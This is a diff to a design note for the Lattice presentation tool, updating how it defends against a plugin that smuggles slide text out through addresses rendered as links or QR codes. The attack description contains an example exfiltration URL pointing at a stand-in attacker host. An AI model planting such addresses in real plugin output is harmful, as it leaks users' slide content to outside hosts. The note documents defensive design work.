@@ -217,13 +217,17 @@ simplifies the plugin contract before user plugins ship (its D4, phases P2 and P
 
 ### 4.5 The address comes only from the author's block (added 2026-10-16, after #2725)
 
-**The attack.** A red team recorded it on 2026-10-12 (`lib/transformers/rebuilt-classes.js:4-11`), and
-PR #2725 (`claude/plugin-inline-door-followups`) is closing it out: the built-in `video`, `qr` variant,
+**The rule now lives in `spec/LPM.md` §10 ("The address rule, on every channel")** and is held by
+`checkSlideTextAddressReaders` (landed 2026-11-09, branch `claude/slide-text-address-gate`; progress below). This
+section keeps the attack and the per-plugin consequences; the spec is the contract.
+
+**The attack.** A red team recorded it on 2026-10-12 (in the header of `lib/transformers/rebuilt-classes.js`, deleted
+2026-11-09), and PR #2725's follow-ups named the fixes: the built-in `video`, `qr` variant,
 `contact` and `wifi` passes read a slide's text and turn any address they find into something the
 viewer loads or scans (a poster link, a QR code). A zip plugin's output also lands on the slide as text. So a
 plugin with no network of its own can write `https://attacker.example/?d=<the slide's text>` onto a video
-slide, and Lattice's own pass publishes it. Today `lib/transformers/rebuilt-classes.js` stops this by
-refusing to let a data plugin's fence draw on those slides (its consumer is `lib/packages/code-door.js`). The owner wants plugins to draw everywhere, which is safe
+slide, and Lattice's own pass publishes it. Until 2026-11-09 `lib/transformers/rebuilt-classes.js` stopped this by
+refusing to let a data plugin's fence draw on those slides. It is deleted: every reader now masks plugin output. The owner wants plugins to draw everywhere, which is safe
 only if no code turns slide text into an address. These plugins are where that becomes true, so they follow
 #2725's five rules:
 
@@ -243,9 +247,8 @@ only if no code turns slide text into an address. These plugins are where that b
    tokens in the engine, before any plugin draws. `lint:deck --fix` offers the `@video{…}` record in its
    place, the same migration as the Marp keywords (§8, decision 2).
 5. **The old pass is deleted in the commit that replaces it**: its registry entry, its DOM half, and its row
-   on #2725's `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` (that check and its allowlist are pending in #2725 and
-   were not yet on its branch at `98a69d6`; if they land renamed, follow the landed names). The shadow list in `rebuilt-classes.js` is derived from
-   the registry, so it shrinks on its own. These plugins never go on that allowlist: if
+   on `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` (`tools/check-ownership.js`). There is no shadow list left to shrink
+   (`rebuilt-classes.js` is deleted). These plugins never go on that allowlist: if
    `checkSlideTextAddressReaders` flags them, the code is wrong.
 
 **What this note's own design had to change.** Three places in §4 would have rebuilt the attack:
@@ -1045,3 +1048,11 @@ Slices 2 and 3 do not start until #2725's check is on `main`, because they delet
   real Chromium: the title stays text, a hostile address adds no second link, the parsed host stays on a provider, a record in running text stays
   code). The Studio attack spec also ran on WebKit and Firefox (`@crosswidth @webkit-tablet @gecko`) at 1440, 820 and 390: 9 of 9 pass. Its first
   WebKit run failed because `page.route()` interception broke the plugin sandbox's loads in WebKit; the spec no longer routes.
+- 2026-11-09: the slide-text address gate landed (branch `claude/slide-text-address-gate`, fixes 1 to 5 of #2725's
+  follow-ups). `checkSlideTextAddressReaders` holds 13 readers in `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS`: 8 masked
+  (qr-card, qr-general, video, collage, team-profile, logo-marks, prose-projection, the runtime's data probe) and 5
+  that build no address from text. The readers mask `[data-lattice-plugin]` through `maskPluginSubtrees`, so
+  `rebuilt-classes.js` and the door's shadow are deleted and a plugin draws on every slide. The rule moved into
+  `spec/LPM.md` §10; §4.5 above now points there. The video row this note expected to delete never existed: `video`
+  was already masked-by-design (§4.5 rule 3) when the gate landed, and it is sanctioned with guard `masks` because
+  its QR and poster come from the stamped figure. Slice 3 (`image`) builds to the gate: it adds no row.
